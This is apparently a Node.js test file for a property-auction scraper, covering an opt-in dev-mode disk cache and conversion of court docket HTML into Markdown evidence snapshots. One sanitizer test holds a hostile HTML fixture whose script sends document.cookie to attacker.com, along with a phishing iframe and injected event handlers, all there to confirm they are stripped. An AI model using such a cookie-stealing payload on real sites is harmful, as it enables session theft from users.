'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');
const crypto = require('node:crypto');

const BaseScraper = require('../../server/scrapers/base');
const {
  fetchTextWithPolicy,
  getDevCachePath,
  isDevCacheActive
} = BaseScraper;

const {
  createMarkdownEvidenceSnapshot,
  recordSnapshot,
  readSnapshot,
  convertHtmlToMarkdown,
  cleanCellText
} = require('../../server/scrapers/discovery-snapshots');

test.describe('P0.5: Parser Dev-Mode Disk Cache (server/scrapers/base.js)', () => {
  let tmpCacheDir;

  test.beforeEach(() => {
    tmpCacheDir = fs.mkdtempSync(path.join(os.tmpdir(), 'dev-cache-test-'));
  });

  test.afterEach(() => {
    try {
      if (tmpCacheDir && fs.existsSync(tmpCacheDir)) {
        fs.rmSync(tmpCacheDir, { recursive: true, force: true });
      }
    } catch (_) {}
  });

  test('isDevCacheActive: strictly opt-in via SCRAPER_DEV_CACHE=1', () => {
    assert.equal(isDevCacheActive({}), false);
    assert.equal(isDevCacheActive({ SCRAPER_DEV_CACHE: '0' }), false);
    assert.equal(isDevCacheActive({ SCRAPER_DEV_CACHE: 'true' }), false);
    assert.equal(isDevCacheActive({ SCRAPER_DEV_CACHE: '1' }), true);
  });

  test('isDevCacheActive: NODE_ENV=production unconditionally disables dev cache', () => {
    assert.equal(isDevCacheActive({ SCRAPER_DEV_CACHE: '1', NODE_ENV: 'production' }), false);
    assert.equal(isDevCacheActive({ SCRAPER_DEV_CACHE: '1', NODE_ENV: 'test' }), true);
    assert.equal(isDevCacheActive({ SCRAPER_DEV_CACHE: '1', NODE_ENV: 'development' }), true);
  });

  test('dev cache bypass: when SCRAPER_DEV_CACHE is unset, fetch is called every time and no cache file written', async () => {
    let fetchCalls = 0;
    const mockFetch = async () => {
      fetchCalls++;
      return {
        status: 200,
        headers: new Headers({ 'content-type': 'text/html' }),
        text: async () => '<html><body>Live Content</body></html>'
      };
    };

    const targetUrl = 'https://example.gov/auctions/list';
    const env = { SCRAPER_DEV_CACHE: undefined, NODE_ENV: 'development' };

    const first = await fetchTextWithPolicy(targetUrl, {
      fetchImpl: mockFetch,
      devCacheDir: tmpCacheDir,
      env
    });
    assert.equal(first, '<html><body>Live Content</body></html>');
    assert.equal(fetchCalls, 1);

    const second = await fetchTextWithPolicy(targetUrl, {
      fetchImpl: mockFetch,
      devCacheDir: tmpCacheDir,
      env
    });
    assert.equal(second, '<html><body>Live Content</body></html>');
    assert.equal(fetchCalls, 2);

    const expectedCacheFile = getDevCachePath(targetUrl, tmpCacheDir);
    assert.equal(fs.existsSync(expectedCacheFile), false, 'Cache file should not be created when dev cache is unset');
  });

  test('dev cache write on miss & hit on subsequent call with console log', async () => {
    let fetchCalls = 0;
    const mockFetch = async () => {
      fetchCalls++;
      return {
        status: 200,
        headers: new Headers({ 'content-type': 'text/html' }),
        text: async () => '<html><body>Cached County Notices</body></html>'
      };
    };

    const targetUrl = 'https://example.gov/notices/county-123';
    const env = { SCRAPER_DEV_CACHE: '1', NODE_ENV: 'development' };

    // Capture console.log
    const logs = [];
    const origLog = console.log;
    console.log = (...args) => {
      logs.push(args.join(' '));
      origLog(...args);
    };

    try {
      // 1. First fetch (cache miss): writes to cache
      const res1 = await fetchTextWithPolicy(targetUrl, {
        fetchImpl: mockFetch,
        devCacheDir: tmpCacheDir,
        env
      });
      assert.equal(res1, '<html><body>Cached County Notices</body></html>');
      assert.equal(fetchCalls, 1);

      const cacheFile = getDevCachePath(targetUrl, tmpCacheDir);
      assert.ok(fs.existsSync(cacheFile), 'Cache file must exist after first fetch');
      assert.equal(fs.readFileSync(cacheFile, 'utf8'), '<html><body>Cached County Notices</body></html>');

      // 2. Second fetch (cache hit): returns cached body without calling fetch
      const res2 = await fetchTextWithPolicy(targetUrl, {
        fetchImpl: mockFetch,
        devCacheDir: tmpCacheDir,
        env
      });
      assert.equal(res2, '<html><body>Cached County Notices</body></html>');
      assert.equal(fetchCalls, 1, 'fetchImpl should not be called on cache hit');

      // Check log
      const hitLog = logs.find((l) => l.includes(`[BaseScraper] DevCache hit: ${targetUrl}`));
      assert.ok(hitLog, 'Must log `[BaseScraper] DevCache hit: <url>`');
    } finally {
      console.log = origLog;
    }
  });

  test('dev cache expiry: files older than 24 hours are re-fetched and updated', async () => {
    let fetchCalls = 0;
    const mockFetch = async () => {
      fetchCalls++;
      return {
        status: 200,
        headers: new Headers({ 'content-type': 'text/html' }),
        text: async () => `<html><body>Response Batch #${fetchCalls}</body></html>`
      };
    };

    const targetUrl = 'https://example.gov/auctions/daily';
    const env = { SCRAPER_DEV_CACHE: '1', NODE_ENV: 'development' };

    // First fetch
    await fetchTextWithPolicy(targetUrl, {
      fetchImpl: mockFetch,
      devCacheDir: tmpCacheDir,
      env
    });
    assert.equal(fetchCalls, 1);

    const cacheFile = getDevCachePath(targetUrl, tmpCacheDir);
    assert.ok(fs.existsSync(cacheFile));

    // Manually backdate file mtime to 25 hours ago (25 * 3600 * 1000 ms)
    const twentyFiveHoursAgo = new Date(Date.now() - 25 * 60 * 60 * 1000);
    fs.utimesSync(cacheFile, twentyFiveHoursAgo, twentyFiveHoursAgo);

    // Second fetch should bypass expired cache and fetch fresh
    const res2 = await fetchTextWithPolicy(targetUrl, {
      fetchImpl: mockFetch,
      devCacheDir: tmpCacheDir,
      env
    });
    assert.equal(fetchCalls, 2, 'Should re-fetch because cache is >24h old');
    assert.equal(res2, '<html><body>Response Batch #2</body></html>');
    assert.equal(fs.readFileSync(cacheFile, 'utf8'), '<html><body>Response Batch #2</body></html>');
  });

  test('NODE_ENV=production disables dev cache even if SCRAPER_DEV_CACHE=1 and cache file already exists', async () => {
    const targetUrl = 'https://example.gov/critical-auction';
    const cacheFile = getDevCachePath(targetUrl, tmpCacheDir);

    // Seed cache file manually
    fs.mkdirSync(tmpCacheDir, { recursive: true });
    fs.writeFileSync(cacheFile, 'OLD_STALE_DATA', 'utf8');

    let fetchCalls = 0;
    const mockFetch = async () => {
      fetchCalls++;
      return {
        status: 200,
        headers: new Headers({ 'content-type': 'text/html' }),
        text: async () => 'FRESH_PRODUCTION_PAYLOAD'
      };
    };

    const res = await fetchTextWithPolicy(targetUrl, {
      fetchImpl: mockFetch,
      devCacheDir: tmpCacheDir,
      env: { SCRAPER_DEV_CACHE: '1', NODE_ENV: 'production' }
    });

    assert.equal(fetchCalls, 1, 'Production must call live fetch');
    assert.equal(res, 'FRESH_PRODUCTION_PAYLOAD', 'Must return live body, not cached');
    assert.equal(fs.readFileSync(cacheFile, 'utf8'), 'OLD_STALE_DATA', 'Production must not overwrite cache file');
  });

  test('BaseScraper instance requestText integrates dev cache seamlessly', async () => {
    let fetchCalls = 0;
    const scraper = new BaseScraper({
      name: 'test-scraper',
      sourceKey: 'civilview',
      fetchImpl: async () => {
        fetchCalls++;
        return {
          status: 200,
          headers: new Headers({ 'content-type': 'text/html' }),
          text: async () => '<div class="notice">Sheriff Sale Active</div>'
        };
      }
    });

    const targetUrl = 'https://salesweb.civilview.com/Sales/SalesDetails?id=999';
    const env = { SCRAPER_DEV_CACHE: '1', NODE_ENV: 'development' };

    const first = await scraper.requestText(targetUrl, {
      env,
      devCacheDir: tmpCacheDir
    });
    assert.equal(first, '<div class="notice">Sheriff Sale Active</div>');
    assert.equal(fetchCalls, 1);

    const second = await scraper.requestText(targetUrl, {
      env,
      devCacheDir: tmpCacheDir
    });
    assert.equal(second, '<div class="notice">Sheriff Sale Active</div>');
    assert.equal(fetchCalls, 1);
  });
});

test.describe('P1.9: Sanitized Markdown Evidence Snapshots (server/scrapers/discovery-snapshots.js)', () => {
  let tmpSnapshotDir;

  test.beforeEach(() => {
    tmpSnapshotDir = fs.mkdtempSync(path.join(os.tmpdir(), 'evidence-snapshot-test-'));
  });

  test.afterEach(() => {
    try {
      if (tmpSnapshotDir && fs.existsSync(tmpSnapshotDir)) {
        fs.rmSync(tmpSnapshotDir, { recursive: true, force: true });
      }
    } catch (_) {}
  });

  test('convertHtmlToMarkdown: converts tabular dockets into clean Markdown tables', () => {
    const docketHtml = `
      <table class="docket-table">
        <thead>
          <tr>
            <th>Case Number</th>
            <th>Defendant</th>
            <th>Sale Date</th>
            <th>Opening Bid</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>2026-CH-00123</td>
            <td>Smith, John</td>
            <td>11/20/2026</td>
            <td>$150,000</td>
          </tr>
          <tr>
            <td>2026-CH-00456</td>
            <td>Doe, Jane</td>
            <td>12/05/2026</td>
            <td>$85,000</td>
          </tr>
        </tbody>
      </table>
    `;

    const md = convertHtmlToMarkdown(docketHtml);
    assert.match(md, /\| Case Number \| Defendant \| Sale Date \| Opening Bid \|/);
    assert.match(md, /\| --- \| --- \| --- \| --- \|/);
    assert.match(md, /\| 2026-CH-00123 \| Smith, John \| 11\/20\/2026 \| \$150,000 \|/);
    assert.match(md, /\| 2026-CH-00456 \| Doe, Jane \| 12\/05\/2026 \| \$85,000 \|/);
  });

  test('convertHtmlToMarkdown: converts key-value docket cards into two-column Field/Value table', () => {
    const docketCardHtml = `
      <table class="case-details">
        <tr><th>Docket ID:</th><td>NJ-2026-098</td></tr>
        <tr><th>Plaintiff:</th><td>Bank of America, N.A.</td></tr>
        <tr><th>Judgment:</th><td>$342,100.50</td></tr>
        <tr><th>Attorney:</th><td>Fein, Such, Kahn &amp; Shepard</td></tr>
      </table>
    `;

    const md = convertHtmlToMarkdown(docketCardHtml);
    assert.match(md, /\| Field \| Value \|/);
    assert.match(md, /\| Docket ID: \| NJ-2026-098 \|/);
    assert.match(md, /\| Plaintiff: \| Bank of America, N.A. \|/);
    assert.match(md, /\| Judgment: \| \$342,100.50 \|/);
    assert.match(md, /\| Attorney: \| Fein, Such, Kahn & Shepard \|/);
  });

  test('convertHtmlToMarkdown: converts property cards, badges, headings, and lists cleanly', () => {
    const cardHtml = `
      <div class="property-card">
        <h3>742 Evergreen Terrace, Springfield, IL</h3>
        <span class="badge badge-success">Active Auction</span>
        <p><strong>Opening Bid:</strong> $62,000</p>
        <p><strong>Appraised Value:</strong> $110,000</p>
        <ul>
          <li>Bedrooms: 3</li>
          <li>Bathrooms: 2</li>
          <li>Parcel: 14-22-301-002</li>
        </ul>
        <hr>
        <p>Purchaser is responsible for all unpaid municipal water and sewer charges.</p>
        <a href="https://springfield-sheriff.gov/dockets/742">Official Sheriff Docket</a>
      </div>
    `;

    const md = convertHtmlToMarkdown(cardHtml);
    assert.match(md, /### 742 Evergreen Terrace, Springfield, IL/);
    assert.match(md, /\[Active Auction\]/);
    assert.match(md, /\*\*Opening Bid:\*\* \$62,000/);
    assert.match(md, /- Bedrooms: 3/);
    assert.match(md, /- Parcel: 14-22-301-002/);
    assert.match(md, /---/);
    assert.match(md, /Purchaser is responsible for all unpaid municipal water/);
    assert.match(md, /\[Official Sheriff Docket\]\(https:\/\/springfield-sheriff\.gov\/dockets\/742\)/);
  });

  test('convertHtmlToMarkdown: strips script tags, iframe, onerror injections, and javascript: links', () => {
    const maliciousHtml = `
      <div class="card" onmouseover="maliciousAlert()">
        <h1>Foreclosure Property Details</h1>
        <script>
          /* Malicious theft of session tokens */
          window.__stolen = document.cookie;
          fetch('http://attacker.com/steal?data=' + encodeURIComponent(document.cookie));
        </script>
        <script src="https://evil-cdn.example/payload.js"></script>
        <style>body { display: none; }</style>
        <noscript><p>Please enable JS</p></noscript>
        <iframe src="http://phishing.site/fake-login"></iframe>
        <p>Legitimate foreclosure docket excerpt.</p>
        <img src="https://example.gov/photo.jpg" onerror="alert('xss-img')">
        <a href="javascript:void(document.location='http://attacker.com')">Click to inspect deed</a>
        <a href="https://county.gov/deeds/doc-123.pdf">Verified County Deed PDF</a>
      </div>
    `;

    const md = convertHtmlToMarkdown(maliciousHtml);

    // Zero executable or injected script code
    assert.ok(!md.includes('script'), 'Must strip <script> tags and script text');
    assert.ok(!md.includes('window.__stolen'), 'Must strip script body');
    assert.ok(!md.includes('attacker.com'), 'Must strip script URLs');
    assert.ok(!md.includes('evil-cdn'), 'Must strip external script tags');
    assert.ok(!md.includes('maliciousAlert'), 'Must strip onmouseover handler');
    assert.ok(!md.includes('alert('), 'Must strip onerror handlers');
    assert.ok(!md.includes('phishing.site'), 'Must strip iframe sources');
    assert.ok(!md.includes('javascript:'), 'Must strip javascript: link href');
    assert.ok(!md.includes('display: none'), 'Must strip <style> blocks');

    // Retains legitimate content and safe links
    assert.match(md, /# Foreclosure Property Details/);
    assert.match(md, /Legitimate foreclosure docket excerpt/);
    assert.match(md, /Click to inspect deed/); // Text kept, dangerous href stripped
    assert.match(md, /\[Verified County Deed PDF\]\(https:\/\/county\.gov\/deeds\/doc-123\.pdf\)/);
  });

  test('createMarkdownEvidenceSnapshot: generates structured snapshot with auditable header', () => {
    const html = `
      <div class="case-card">
        <h2>Sheriff Sale Auction - Case #2026-4432</h2>
        <table>
          <tr><th>Parcel APN:</th><td>045-882-19</td></tr>
          <tr><th>Sale Date:</th><td>November 18, 2026</td></tr>
          <tr><th>Opening Bid:</th><td>$115,000</td></tr>
        </table>
      </div>
    `;

    const snapshot = createMarkdownEvidenceSnapshot({
      sourceKey: 'civilview',
      recordId: '2026-4432',
      html,
      title: 'CivilView Sheriff Sale: 2026-4432',
      metadata: {
        county: 'Burlington',
        state: 'NJ',
        court: 'Superior Court of New Jersey'
      }
    });

    assert.equal(snapshot.sourceKey, 'civilview');
    assert.equal(snapshot.recordId, '2026-4432');
    assert.equal(snapshot.title, 'CivilView Sheriff Sale: 2026-4432');
    assert.ok(snapshot.sha256 && /^[a-f0-9]{64}$/.test(snapshot.sha256));

    // Audit header assertions
    assert.match(snapshot.markdown, /# CivilView Sheriff Sale: 2026-4432/);
    assert.match(snapshot.markdown, /- \*\*Source:\*\* civilview/);
    assert.match(snapshot.markdown, /- \*\*Record ID:\*\* 2026-4432/);
    assert.match(snapshot.markdown, /- \*\*county:\*\* Burlington/);
    assert.match(snapshot.markdown, /- \*\*state:\*\* NJ/);
    assert.match(snapshot.markdown, /- \*\*court:\*\* Superior Court of New Jersey/);
    assert.match(snapshot.markdown, /---/);

    // Table body assertions
    assert.match(snapshot.markdown, /## Sheriff Sale Auction - Case #2026-4432/);
    assert.match(snapshot.markdown, /\| Parcel APN: \| 045-882-19 \|/);
    assert.match(snapshot.markdown, /\| Opening Bid: \| \$115,000 \|/);

    // String compatibility assertions
    assert.equal(typeof snapshot.toString(), 'string');
    assert.ok(snapshot.includes('Burlington'));
  });

  test('recordSnapshot: saves raw JSON and conditioned markdown evidence snapshot', async () => {
    const html = `
      <div class="docket">
        <h2>HUD REO Asset Disposition</h2>
        <p><strong>Address:</strong> 142 River Rd, Toledo, OH</p>
        <p><strong>List Price:</strong> $49,900</p>
      </div>
    `;

    // 1. Record without saveMarkdown
    const resNoMd = await recordSnapshot({
      sourceKey: 'hud',
      recordId: 'OH-HUD-998',
      rawPayload: { caseId: 'OH-HUD-998', price: 49900 },
      html,
      saveMarkdown: false
    }, { snapshotDir: tmpSnapshotDir });

    assert.equal(resNoMd.saved, true);
    assert.ok(fs.existsSync(resNoMd.rawPath));
    assert.equal(resNoMd.markdownPath, null);
    assert.equal(resNoMd.markdownSnapshot, null);

    // 2. Record with saveMarkdown: true
    const resWithMd = await recordSnapshot({
      sourceKey: 'hud',
      recordId: 'OH-HUD-998',
      rawPayload: { caseId: 'OH-HUD-998', price: 49900 },
      html,
      saveMarkdown: true,
      metadata: { county: 'Lucas', state: 'OH' }
    }, { snapshotDir: tmpSnapshotDir });

    assert.equal(resWithMd.saved, true);
    assert.ok(fs.existsSync(resWithMd.rawPath));
    assert.ok(fs.existsSync(resWithMd.markdownPath));
    assert.ok(resWithMd.markdownPath.endsWith('OH-HUD-998.md'));

    const mdContent = fs.readFileSync(resWithMd.markdownPath, 'utf8');
    assert.match(mdContent, /# HUD Evidence Snapshot: OH-HUD-998/);
    assert.match(mdContent, /- \*\*county:\*\* Lucas/);
    assert.match(mdContent, /## HUD REO Asset Disposition/);
    assert.match(mdContent, /\*\*Address:\*\* 142 River Rd, Toledo, OH/);

    // 3. readSnapshot verification
    const read = readSnapshot({
      sourceKey: 'hud',
      recordId: 'OH-HUD-998',
      snapshotDir: tmpSnapshotDir
    });

    assert.ok(read.raw);
    assert.equal(read.raw.recordId, 'OH-HUD-998');
    assert.equal(read.raw.rawPayload.price, 49900);
    assert.ok(read.markdown);
    assert.match(read.markdown, /Toledo, OH/);
  });
});
